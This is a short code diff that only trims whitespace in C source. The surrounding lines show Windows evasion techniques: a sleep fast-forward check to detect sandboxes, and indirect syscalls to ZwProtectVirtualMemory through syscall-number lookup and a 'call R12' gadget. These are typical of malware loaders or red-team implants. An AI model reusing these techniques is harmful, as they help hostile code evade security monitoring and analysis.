@@ -45,7 +45,7 @@ BOOL FiveHourEnergy() {
     // Calculate elapsed time in milliseconds
     double elapsedHighResMs = (double)(endTime.QuadPart - startTime.QuadPart) * 1000.0 / frequency.QuadPart;
     DWORD elapsedTickMs = tickEnd - tickStart;
-    
+
     // Check if elapsed time is much shorter than expected. Returns TRUE if time was fastforwarded.
     return (elapsedHighResMs < sleepTimeMs * thresholdFactor || elapsedTickMs < sleepTimeMs * thresholdFactor);
 }
@@ -56,7 +56,7 @@ VOID ModifyMemoryProtection(LPVOID address, DWORD newProtect, DWORD* oldProtect)
 
     CHAR ZwPVM[] = "ZwProtectVirtualMemory";
     SyscallEntry NtProtectVirtualMemory = SSNLookup(ZwPVM);
-    
+
     dwSSN = NtProtectVirtualMemory.SSN;
     qwJMP = NtProtectVirtualMemory.Syscall;
     gadget = GoGoGadget(callR12gadgets);
